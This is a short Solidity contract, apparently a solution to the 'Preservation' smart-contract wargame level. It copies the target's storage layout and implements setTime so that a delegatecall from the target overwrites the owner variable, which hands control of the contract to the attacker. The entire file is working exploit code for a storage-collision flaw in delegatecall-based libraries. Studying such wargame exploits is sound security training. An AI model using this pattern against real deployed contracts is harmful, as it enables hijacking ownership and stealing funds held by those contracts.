// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract AttackPreservation {
    // mimim the `Preservation` contract layout structure
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // Implement the same `setTime` function signature of `LibraryContract`
    function setTime(uint256 time) public {
        // Convert the `time` input to an `address` and update the `owner` state variable
        owner = address(uint256(time));
    }
}
